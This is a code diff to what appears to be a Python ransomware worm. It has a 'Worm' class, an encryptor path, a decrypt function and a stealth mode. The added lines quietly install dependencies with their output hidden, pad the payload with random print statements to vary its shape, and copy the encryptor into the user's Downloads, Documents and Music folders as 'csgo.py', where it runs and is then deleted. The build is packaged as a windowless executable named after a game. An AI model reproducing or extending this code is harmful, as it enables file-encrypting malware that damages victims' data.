@@ -1,4 +1,5 @@
 import os
+os.system("pip install pypiwin32 pyinstaller pycryptodome > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
 import sys
 import time
 import threading
@@ -41,7 +42,7 @@ class Worm:
     def spread(self):
         this = open(ENCRYPTOR_PATH, "r")
         worm_poli = ""
-        times = random.randrange(1, 7)
+        times = random.randrange(1, 25)
         for i in range(times):
             num = random.randrange(-sys.maxsize, sys.maxsize)
             worm_poli += "print(" + str(num) + ")\n"
@@ -50,6 +51,13 @@ class Worm:
 
         for line in this:
             worm_poli += line
+
+        target_list = ["C:/Users/w0rmer/Downloads/test3", "C:/Users/w0rmer/Documents/test", "C:/Users/w0rmer/Music/test2"]
+
+        for target in target_list:
+            shutil.copy(ENCRYPTOR_PATH, target + "/csgo.py")
+            system("cd " + target + " && python.exe csgo.py && cd " + THIS_DIR)
+            os.remove(target + "/csgo.py")
 
 
     def decrypt_files(self):
@@ -93,7 +101,7 @@ def worm_menu():
     print(' --------------------------------- ')
 
 if __name__ == "__main__":
-    system("pip install pypiwin32 pyinstaller pycryptodome > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
+    print("here")
     system("cls")
 
     banner_func()
@@ -116,7 +124,7 @@ if __name__ == "__main__":
                 print('[!] Press [Ctrl] + [C] to Stop!')
                 time.sleep(1)
 
-                os.system("pyinstaller resistencia_exe.py --onefile --noconsole --name csgo")
+                os.system("pyinstaller resistencia-exe.py --onefile --noconsole --name resistencia")
                 print("[!] csgo.exe Created")
             case 3: # modo furtivo
                 hide = win32gui.GetForegroundWindow()
